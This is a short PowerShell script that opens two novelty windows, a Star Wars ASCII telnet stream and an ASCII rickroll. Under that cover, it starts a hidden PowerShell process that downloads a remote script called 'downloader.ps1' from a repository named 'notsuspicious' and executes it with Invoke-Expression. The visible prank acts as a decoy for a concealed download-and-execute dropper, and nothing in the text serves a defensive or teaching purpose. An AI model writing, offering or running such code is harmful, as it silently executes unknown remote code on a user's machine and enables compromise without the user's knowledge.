
# Start Star Wars in a new Command Prompt window to the left
Start-Process cmd -ArgumentList "/c start telnet towel.blinkenlights.nl" -WindowStyle Normal
# Start rickroll in ASCII in a new Command Prompt window to the right
Start-Process cmd -ArgumentList "/c start cmd /k curl ascii.live/rick" -WindowStyle Normal

# Wait for a moment to let the windows start
Start-Sleep -Seconds 5

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.Arguments = "-WindowStyle Hidden -NoLogo -NoProfile -Command `"Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content`""
$psi.UseShellExecute = $false
$psi.RedirectStandardOutput = $true

$p = [System.Diagnostics.Process]::Start($psi)

